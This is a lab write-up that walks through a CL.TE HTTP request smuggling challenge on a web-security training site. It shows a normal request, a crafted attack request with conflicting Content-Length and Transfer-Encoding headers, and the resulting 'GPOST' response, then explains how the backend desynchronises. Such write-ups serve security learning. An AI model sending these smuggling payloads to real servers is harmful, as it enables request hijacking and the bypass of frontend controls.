## 1. Introduction

This vulnerability is when the frontend uses the Content-Length header and the backend server uses the Transfer-Encoding header.

So, this means that the frontend server processes the CL and determines the size of the body, while the backend processes the TE and treats the message body as using chunked encoding.

For these attacks Burp Suite will be used.

## 2. Challenge

Fronted doesn't support chunked encoding, and rejects requests that aren't using GET or POST.

Smuggle a request to the backend server, so the next request processed by the backend appears to use the method GPOST.

## 3. Solution

For this I will create two requests, one as an "attack request" and one "normal request".

For both of them we need to use HTTP/1.1

Normal request:

```http
POST / HTTP/1.1
Host: 0a2a00f1046937b78042f3fd00e600ee.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Attack request:

```http
POST / HTTP/1.1
Host: 0a2a00f1046937b78042f3fd00e600ee.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

And the response is:

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```

## 4. Explanation

Since the frontend processes Content-Length, in the Attack Request we need to disable the automatic updating of the CL, because we want to control the body that we are sending.

In our case the length of the body is 6 bytes, so we set the CL to 6.

There we add also the Transfer-Ecoding to chunked, because we want to control also how the backed proceeds our request.

So, the backend now will think that the first request will end at "0", and the remaining part (our case just the G), will be counted by the backend as the start of the next request.

After this is proceeded by the backend we send the normal request, and the backend will append it to the remainders of the attack request (G), so the method will be set to GPOST.